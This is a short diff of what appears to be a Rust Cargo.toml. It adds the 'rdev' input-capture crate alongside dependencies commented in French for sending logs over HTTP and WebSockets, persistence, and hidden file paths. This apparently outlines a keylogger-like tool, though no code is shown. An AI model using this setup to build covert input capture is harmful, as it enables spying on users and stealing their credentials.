@@ -27,6 +27,7 @@ hex = "0.4"
 reqwest = { version = "0.11", features = ["blocking", "json"] }  # Envoi via HTTP
 tokio = { version = "1", features = ["full"] }  # Asynchronisme
 websocket = "0.26"   # Envoi des logs via WebSockets
+rdev = "0.5"
 
 # Persistance et gestion des fichiers
 dirs = "5.0"          # Gestion des chemins de fichiers cachés
